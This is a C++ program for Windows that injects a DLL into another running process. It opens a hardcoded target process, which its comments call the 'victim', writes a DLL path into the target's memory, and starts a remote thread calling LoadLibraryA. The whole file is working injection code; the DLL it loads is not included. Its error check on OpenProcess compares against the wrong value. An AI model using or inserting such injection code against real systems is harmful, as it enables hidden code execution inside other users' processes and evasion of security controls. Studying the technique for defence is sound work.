#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdio.h>


int main()
{
	char buffer [] = "C:\\DLLForInjectionExample.dll";

	/*
	* Get process handle passing in the process ID.
	*/
	HANDLE hProcess;
	DWORD dwProcessId = 7976; //cmd.exe pid

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	
	if (hProcess == INVALID_HANDLE_VALUE) {
		printf("ERROR: COULDN'T OPEN THE VICTIM PROCESS!");
		return 1;
	}

	/*
	* Get address of the LoadLibrary function.
	*/
	LPVOID addr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	if (addr == NULL) {
		printf("Error: the LoadLibraryA function was not found inside kernel32.dll library.\n");
	}

	/*
	* Allocate new memory region inside the process's address space.
	*/
	LPVOID arg = VirtualAllocEx(hProcess, NULL, strlen(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (arg == NULL) {
		printf("Error: the memory could not be allocated inside the chosen process.\n");
	}

	/*
	* Write the argument to LoadLibraryA to the process's newly allocated memory region.
	*/
	int n = WriteProcessMemory(hProcess, arg, buffer, strlen(buffer), NULL);
	if (n == 0) {
		printf("Error: there was no bytes written to the process's address space.\n");
	}

	/*
	* Inject our DLL into the process's address space.
	*/
	DWORD threadID;
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,(LPTHREAD_START_ROUTINE) addr, arg, NULL,&threadID);
	wprintf(L"TID : %d", threadID);

	if (hThread == NULL) {
		printf("Error: the remote thread could not be created.  ERROR CODE : %d\n", GetLastError());
	}
	else {
		printf("Success: the remote thread was successfully created.\n");
	}

	/*
	* Close the handle to the process, becuase we've already injected the DLL.
	*/
	CloseHandle(hProcess);
	getchar();
	return 0;

}

